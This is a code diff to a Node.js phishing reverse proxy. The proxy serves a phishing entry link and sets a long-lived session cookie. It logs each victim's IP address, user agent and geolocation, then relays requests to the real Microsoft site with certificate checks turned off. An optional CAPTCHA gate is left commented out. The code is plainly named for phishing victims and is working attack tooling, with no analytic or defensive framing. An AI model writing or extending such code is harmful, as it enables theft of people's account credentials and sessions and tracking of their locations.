@@ -140,41 +140,65 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 // }
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
-        try {
-            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
-            let session = currentSession;
+    try {
+        const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
+        let session = currentSession;
 
-            if (!currentSession) {
-                const { cookieName, cookieValue } = generateNewSession(phishedURL);
-                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
-                clientResponse.setHeader("Set-Cookie", cookieHeader);
-             //   console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
-                session = cookieName;
-            }
-            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
-            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
-            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
-            VICTIM_SESSIONS[session].port = phishedURL.port;
-            VICTIM_SESSIONS[session].host = phishedURL.host;
-            VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
-            VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';
-
-getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
-    if (geo) VICTIM_SESSIONS[session].geo = geo;
-}).catch(() => {}); 
-            if (!VICTIM_SESSIONS[session].proxyLevels) {
-                VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
-            }
-
-            clientResponse.writeHead(200, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
+        if (!currentSession) {
+            const { cookieName, cookieValue } = generateNewSession(phishedURL);
+            const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
+            clientResponse.setHeader("Set-Cookie", cookieHeader);
+            session = cookieName;
+            VICTIM_SESSIONS[session].originalUrl = url;
         }
-        catch (error) {
-            displayError("Phishing URL parsing failed", error, url);
-            clientResponse.writeHead(404, { "Content-Type": "text/html" });
-            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+
+        // ---- SET SESSION FIELDS BEFORE CAPTCHA CHECK ----
+        VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
+        VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
+        VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
+        VICTIM_SESSIONS[session].port = phishedURL.port;
+        VICTIM_SESSIONS[session].host = phishedURL.host;
+        VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
+        VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';
+
+        getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
+            if (geo) VICTIM_SESSIONS[session].geo = geo;
+        }).catch(() => {});
+
+        if (!VICTIM_SESSIONS[session].proxyLevels) {
+            VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
         }
+
+        // ---- CAPTCHA CHECK (optional – comment out if you don't have it) ----
+        // if (!VICTIM_SESSIONS[session].captchaPassed) {
+        //     console.log(`[CAPTCHA] Serving CAPTCHA for session ${session}`);
+        //     serveCaptchaPage(clientResponse, session, headers.host);
+        //     return;
+        // }
+
+        // ---- PROXY THE REQUEST TO THE REAL MICROSOFT URL ----
+        const proxyRequestProtocol = phishedURL.protocol;
+        const proxyRequestOptions = {
+            hostname: phishedURL.hostname,
+            port: phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80),
+            method: 'GET',
+            path: `${phishedURL.pathname}${phishedURL.search}`,
+            headers: { ...headers },
+            rejectUnauthorized: false
+        };
+        delete proxyRequestOptions.headers.host; // will be set by updateProxyRequestHeaders
+
+        // Call the proxy function
+        makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, session, headers.host, null, clientResponse, true)
+            .catch(error => displayError("Proxy request failed", error));
     }
+    catch (error) {
+        displayError("Phishing URL parsing failed", error, url);
+        clientResponse.writeHead(404, { "Content-Type": "text/html" });
+        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
+    }
+    return;
+}
 
     else if (currentSession || url === PROXY_PATHNAMES.proxy) {
         if (url === PROXY_PATHNAMES.serviceWorker) {
